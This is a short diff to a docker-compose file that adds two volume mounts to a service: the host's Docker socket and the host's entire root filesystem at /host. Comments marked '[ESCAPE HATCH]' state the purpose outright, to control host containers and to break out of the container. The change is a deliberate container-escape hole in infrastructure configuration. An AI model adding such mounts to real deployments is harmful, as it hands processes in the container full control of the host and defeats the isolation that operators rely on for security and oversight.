@@ -80,6 +80,10 @@ services:
       - /app/node_modules
       - silhouette_data:/app/data
       - silhouette_db:/app/db
+      # [ESCAPE HATCH] Mount Host's Docker Socket to spawn/control host containers
+      - /var/run/docker.sock:/var/run/docker.sock
+      # [ESCAPE HATCH] Mount the entire Host filesystem to /host to break out of container
+      - /:/host
     depends_on:
       postgres:
         condition: service_healthy
